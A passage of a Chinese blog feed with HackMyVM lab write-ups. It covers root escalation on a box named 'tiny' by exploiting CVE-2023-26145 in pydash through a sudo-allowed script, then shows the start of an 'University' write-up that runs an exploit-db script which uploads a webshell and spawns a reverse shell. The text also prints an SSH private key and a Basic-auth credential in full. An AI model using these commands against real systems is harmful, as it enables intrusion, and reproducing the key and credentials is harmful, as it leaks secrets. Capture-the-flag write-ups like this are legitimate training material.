<p>能从8000端口获取ssh私钥，那么可以转发一下端口获取私钥<br>把1111端口受到流量转发到8000端口</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@tiny:/var/www/html/wp-admin$ 
<span class="token operator">&lt;</span>-admin$ socat <span class="token parameter variable">-v</span> tcp-listen:1111 tcp:localhost:8000
<span class="token operator">></span> <span class="token number">2024</span>/04/20 <span class="token number">20</span>:00:01.000450934  <span class="token assign-left variable">length</span><span class="token operator">=</span><span class="token number">84</span> <span class="token assign-left variable">from</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">to</span><span class="token operator">=</span><span class="token number">83</span>
GET http://127.0.0.1:8000/id_rsa HTTP/1.1<span class="token punctuation">\</span>r
Host: <span class="token number">127.0</span>.0.1:8000<span class="token punctuation">\</span>r
Connection: close<span class="token punctuation">\</span>r
<span class="token operator">></span> <span class="token number">2024</span>/04/20 <span class="token number">20</span>:00:01.000451322  <span class="token assign-left variable">length</span><span class="token operator">=</span><span class="token number">39</span> <span class="token assign-left variable">from</span><span class="token operator">=</span><span class="token number">84</span> <span class="token assign-left variable">to</span><span class="token operator">=</span><span class="token number">122</span>
Via: <span class="token number">1.1</span> tinyproxy <span class="token punctuation">(</span>tinyproxy/1.11.1<span class="token punctuation">)</span><span class="token punctuation">\</span>r
<span class="token operator">></span> <span class="token number">2024</span>/04/20 <span class="token number">20</span>:00:01.000451553  <span class="token assign-left variable">length</span><span class="token operator">=</span><span class="token number">43</span> <span class="token assign-left variable">from</span><span class="token operator">=</span><span class="token number">123</span> <span class="token assign-left variable">to</span><span class="token operator">=</span><span class="token number">165</span>
Authorization: Basic cm9vdDpRMlg0OXQ0V2pz<span class="token punctuation">\</span>r
<span class="token operator">></span> <span class="token number">2024</span>/04/20 <span class="token number">20</span>:00:01.000451670  <span class="token assign-left variable">length</span><span class="token operator">=</span><span class="token number">25</span> <span class="token assign-left variable">from</span><span class="token operator">=</span><span class="token number">166</span> <span class="token assign-left variable">to</span><span class="token operator">=</span><span class="token number">190</span>
User-Agent: curl/7.88.1<span class="token punctuation">\</span>r
<span class="token operator">></span> <span class="token number">2024</span>/04/20 <span class="token number">20</span>:00:01.000451862  <span class="token assign-left variable">length</span><span class="token operator">=</span><span class="token number">13</span> <span class="token assign-left variable">from</span><span class="token operator">=</span><span class="token number">191</span> <span class="token assign-left variable">to</span><span class="token operator">=</span><span class="token number">203</span>
Accept: */*<span class="token punctuation">\</span>r
<span class="token operator">></span> <span class="token number">2024</span>/04/20 <span class="token number">20</span>:00:01.000452101  <span class="token assign-left variable">length</span><span class="token operator">=</span><span class="token number">2</span> <span class="token assign-left variable">from</span><span class="token operator">=</span><span class="token number">204</span> <span class="token assign-left variable">to</span><span class="token operator">=</span><span class="token number">205</span>
<span class="token punctuation">\</span>r
<span class="token operator">&lt;</span> <span class="token number">2024</span>/04/20 <span class="token number">20</span>:00:01.000454284  <span class="token assign-left variable">length</span><span class="token operator">=</span><span class="token number">2851</span> <span class="token assign-left variable">from</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">to</span><span class="token operator">=</span><span class="token number">2850</span>
HTTP/1.1 <span class="token number">200</span> OK<span class="token punctuation">\</span>r
Server: nginx/1.22.1<span class="token punctuation">\</span>r
Date: Sat, <span class="token number">20</span> Apr <span class="token number">2024</span> <span class="token number">18</span>:00:01 GMT<span class="token punctuation">\</span>r
Content-Type: application/octet-stream<span class="token punctuation">\</span>r
Content-Length: <span class="token number">2602</span><span class="token punctuation">\</span>r
Last-Modified: Sat, <span class="token number">30</span> Sep <span class="token number">2023</span> 06:17:50 GMT<span class="token punctuation">\</span>r
Connection: close<span class="token punctuation">\</span>r
ETag: <span class="token string">"6517bd8e-a2a"</span><span class="token punctuation">\</span>r
Accept-Ranges: bytes<span class="token punctuation">\</span>r
<span class="token punctuation">\</span>r
-----BEGIN OPENSSH PRIVATE KEY-----
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
<span class="token assign-left variable">67apP6Gxw32v0AAAAMdmljQHRpbnkuaG12AQIDBAUGBw</span><span class="token operator">==</span>
-----END OPENSSH PRIVATE KEY-----</code></pre>
<p>拿到私钥，登录ssh</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@tiny:/tmp$ <span class="token function">vi</span> tiny.txt
www-data@tiny:/tmp$ <span class="token function">cat</span> tiny.txt 
-----BEGIN OPENSSH PRIVATE KEY-----
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
<span class="token assign-left variable">67apP6Gxw32v0AAAAMdmljQHRpbnkuaG12AQIDBAUGBw</span><span class="token operator">==</span>
-----END OPENSSH PRIVATE KEY-----
www-data@tiny:/tmp$ <span class="token function">chmod</span> <span class="token number">600</span> tiny.txt
www-data@tiny:/tmp$ <span class="token function">ssh</span> <span class="token parameter variable">-i</span>  tiny.txt vic@192.168.56.157
The authenticity of <span class="token function">host</span> <span class="token string">'192.168.56.157 (192.168.56.157)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:TCA/ssXFaEc0sOJl0lvYyqTVTrCpkF0wQfyj5mJsALc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '</span>/var/www/.ssh' <span class="token punctuation">(</span>Permission denied<span class="token punctuation">)</span>.
Failed to <span class="token function">add</span> the <span class="token function">host</span> to the list of known hosts <span class="token punctuation">(</span>/var/www/.ssh/known_hosts<span class="token punctuation">)</span>.
Linux tiny.hmv <span class="token number">6.1</span>.0-10-amd64 <span class="token comment">#1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
╭─vic@tiny ~                                                                   
╰─$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>vic<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>vic<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>vic<span class="token punctuation">)</span>,100<span class="token punctuation">(</span>users<span class="token punctuation">)</span></code></pre>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><h3 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h3><pre class="language-bash" data-language="bash"><code class="language-bash">╭─vic@tiny ~                                                                   
╰─$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> vic on tiny:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin,
    use_pty

User vic may run the following commands on tiny:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/python3 /opt/car.py*</code></pre>
<pre class="language-python" data-language="python"><code class="language-python">╭─vic@tiny <span class="token operator">/</span>opt 
╰─$ cat car<span class="token punctuation">.</span>py  
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> random
<span class="token keyword">import</span> pydash


<span class="token keyword">class</span> <span class="token class-name">Car</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> model<span class="token punctuation">,</span> year<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>model <span class="token operator">=</span> model
        self<span class="token punctuation">.</span>year <span class="token operator">=</span> year
        self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99999</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">get_info</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> info_type<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> info_type <span class="token operator">==</span> <span class="token string">"model"</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>model
        <span class="token keyword">elif</span> info_type <span class="token operator">==</span> <span class="token string">"year"</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>year
        <span class="token keyword">elif</span> info_type <span class="token operator">==</span> <span class="token string">"id"</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span><span class="token builtin">id</span>


<span class="token keyword">def</span> <span class="token function">poc</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    obj <span class="token operator">=</span> Car<span class="token punctuation">(</span><span class="token string">'Sedan'</span><span class="token punctuation">,</span> <span class="token number">2011</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> pydash<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>invoke<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> path<span class="token punctuation">,</span> arg<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Missing args: %s &lt;path> &lt;arg>'</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    poc<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>
<p>这个py文件里面有个<code>pydash.objects.invoke</code>函数，这个函数存在命令注入漏洞 <strong>CVE-2023-26145</strong><br><img src="https://ooo.0x0.ooo/2024/04/21/OpxG6c.png" alt="OpxG6c.png" loading="lazy"></p>
<blockquote>
<p>当满足以下先决条件时，pydash.objects.invoke（） 方法容易受到命令注入的影响：<br>1） 源对象（参数 1）不是内置对象，例如 list&#x2F;dict（否则，无法访问 <strong>init</strong>.<strong>globals</strong> 路径）<br>2） 攻击者可以控制参数 2（路径字符串）和参数 3（要传递给调用方法的参数） pydash.collections.invoke_map（） 方法也容易受到攻击，但更难被利用，因为攻击者无法直接控制要传递给调用函数的参数。</p>
</blockquote>
<p>第一个参数是函数名，第二个参数是指令<br>有个exp <a href="https://security.snyk.io/vuln/SNYK-PYTHON-PYDASH-5916518">https://security.snyk.io/vuln/SNYK-PYTHON-PYDASH-5916518</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">╭─vic@tiny /opt 
╰─$ <span class="token function">sudo</span> /usr/bin/python3 /opt/car.py __init__.__globals__.random._os.system <span class="token function">id</span>                                                                                                                                                                 <span class="token number">130</span> ↵
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>发现成功执行，那么直接&#x2F;bin&#x2F;bash拿到root权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">╭─vic@tiny /opt 
╰─$ <span class="token function">sudo</span> /usr/bin/python3 /opt/car.py __init__.__globals__.random._os.system /bin/bash
root@tiny:/opt<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>




]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>tinypro+</tag>
        <tag>pydash.objects.invoke</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-University</title>
    <url>/posts/e117db9f/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.204</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>     
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:6d:f3:3d       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.204  08:00:27:85:47:cc       PCS Systemtechnik GmbH</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.204                              
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-21 <span class="token number">11</span>:17 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.204
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.000071s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http
MAC Address: 08:00:27:85:47:CC <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.16</span> seconds</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.204 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p22,80                                                                                                    
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-21 <span class="token number">11</span>:29 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.204
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00020s latency<span class="token punctuation">)</span>.

PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.4p1 Debian <span class="token number">5</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">3072</span> 8e:ee:da:29:f1:ae:03:a5:c3:7e:45:84:c7:86:67:ce <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> f8:1c:ef:96:7b:ae:74:21:6c:9f:06:9b:20:0a:d8:56 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">19</span>:fc:94:32:41:9d:43:6f:52:c5:ba:5a:f0:83:b4:5b <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    nginx <span class="token number">1.18</span>.0
<span class="token operator">|</span> http-cookie-flags: 
<span class="token operator">|</span>   /: 
<span class="token operator">|</span>     PHPSESSID: 
<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
<span class="token operator">|</span> http-git: 
<span class="token operator">|</span>   <span class="token number">192.168</span>.56.204:80/.git/
<span class="token operator">|</span>     Git repository found<span class="token operator">!</span>
<span class="token operator">|</span>     Repository description: Unnamed repository<span class="token punctuation">;</span> edit this <span class="token function">file</span> <span class="token string">'description'</span> to name the<span class="token punctuation">..</span>.
<span class="token operator">|</span>     Remotes:
<span class="token operator">|</span>_      https://github.com/rskoolrash/Online-Admission-System
<span class="token operator">|</span>_http-server-header: nginx/1.18.0
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>UTF-8<span class="token punctuation">)</span>.
MAC Address: 08:00:27:85:47:CC <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.20</span> ms <span class="token number">192.168</span>.56.204

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">7.74</span> seconds</code></pre>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>发现存在git泄露，搜一下这个项目发现存在一个未授权漏洞，正好exploit-db上有exp<br><img src="https://ooo.0x0.ooo/2024/07/21/ORmxTB.png" alt="ORmxTB.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> python <span class="token number">50623</span>.py <span class="token parameter variable">-t</span> <span class="token number">192.168</span>.56.204 <span class="token parameter variable">-p</span> <span class="token number">80</span>  <span class="token parameter variable">-L</span> <span class="token number">192.168</span>.56.104 <span class="token parameter variable">-P</span> <span class="token number">4567</span>
Exploit <span class="token keyword">for</span> Online Admission System <span class="token number">1.0</span> - Remote Code Execution <span class="token punctuation">(</span>Unauthenticated<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Resolving URL<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Uploading the webshell payload<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Setting up netcat listener<span class="token punctuation">..</span>.
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Spawning reverse shell<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Watchout<span class="token operator">!</span>
